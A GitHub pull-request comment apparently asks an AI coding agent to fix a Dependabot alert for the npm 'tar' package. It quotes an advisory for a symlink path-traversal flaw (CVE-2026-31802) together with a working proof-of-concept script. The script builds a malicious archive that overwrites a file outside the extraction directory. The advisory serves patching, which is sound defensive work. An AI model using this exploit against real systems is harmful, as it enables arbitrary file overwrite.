@devin-ai-integration Please resolve this Dependabot security alert.

**Instructions:**
1. Analyze the vulnerability and understand its impact
2. Update the affected dependency to a secure version. If updating a poetry lock file, use the same version of poetry used to generate the existing one.
3. Ideally resolve this without using an override - prefer updating the dependency directly
4. If an override is absolutely necessary, document why in the PR description
5. Run tests to ensure the update doesn't break anything
6. Push your fix to this PR branch and tag @davidkonigsberg for review
7. Delete the scaffold file (.github/dependabot-alerts/alert-*.md) as part of your fix
8. Update the PR title, if needed, to pass CI checks

**Alert Details:**

- **Package:** tar (npm)
- **Severity:** HIGH
- **Vulnerable versions:** <= 7.5.10
- **Patched version:** 7.5.11
- **CVE:** CVE-2026-31802
- **GHSA:** GHSA-9ppj-qmqm-q256
- **Manifest:** pnpm-lock.yaml

**Summary:**
node-tar Symlink Path Traversal via Drive-Relative Linkpath

**Description:**
### Summary
`tar` (npm) can be tricked into creating a symlink that points outside the extraction directory by using a drive-relative symlink target such as `C:../../../target.txt`, which enables file overwrite outside `cwd` during normal `tar.x()` extraction.

### Details
The extraction logic in `Unpack[STRIPABSOLUTEPATH]` validates `..` segments against a resolved path that still uses the original drive-relative value, and only afterwards rewrites the stored `linkpath` to the stripped value.

What happens with `linkpath: "C:../../../target.txt"`:
1. `stripAbsolutePath()` removes `C:` and rewrites the value to `../../../target.txt`.
2. The escape check resolves using the original pre-stripped value, so it is treated as in-bounds and accepted.
3. Symlink creation uses the rewritten value (`../../../target.txt`) from nested path `a/b/l`.
4. Writing through the extracted symlink overwrites the outside file (`../target.txt`).

This is reachable in standard usage (`tar.x({ cwd, file })`) when extracting attacker-controlled tar archives.

### PoC
Tested on Arch Linux with `tar@7.5.10`.

PoC script (`poc.cjs`):

```js
const fs = require('fs')
const path = require('path')
const { Header, x } = require('tar')

const cwd = process.cwd()
const target = path.resolve(cwd, '..', 'target.txt')
const tarFile = path.join(cwd, 'poc.tar')

fs.writeFileSync(target, 'ORIGINAL\n')

const b = Buffer.alloc(1536)
new Header({
  path: 'a/b/l',
  type: 'SymbolicLink',
  linkpath: 'C:../../../target.txt',
}).encode(b, 0)
fs.writeFileSync(tarFile, b)

x({ cwd, file: tarFile }).then(() => {
  fs.writeFileSync(path.join(cwd, 'a/b/l'), 'PWNED\n')
  process.stdout.write(fs.readFileSync(target, 'utf8'))
})
```

Run:

```bash
node poc.cjs && readlink a/b/l && ls -l a/b/l ../target.txt
```

Observed output:

```text
PWNED
../../../target.txt
lrwxrwxrwx - joshuavr  7 Mar 18:37 󰡯 a/b/l -> ../../../target.txt
.rw-r--r-- 6 joshuavr  7 Mar 18:37  ../target.txt
```

`PWNED` confirms outside file content overwrite. `readlink` and `ls -l` confirm the extracted symlink points outside the extraction directory.

### Impact
This is an arbitrary file overwrite primitive outside the intended extraction root, with the permissions of the process performing extraction.

Realistic scenarios:
- CLI tools unpacking untrusted tarballs into a working directory
- build/update pipelines consuming third-party archives
- services that import user-supplied tar files

---
[View Dependabot Alert](https://github.com/fern-api/fern/security/dependabot/871)
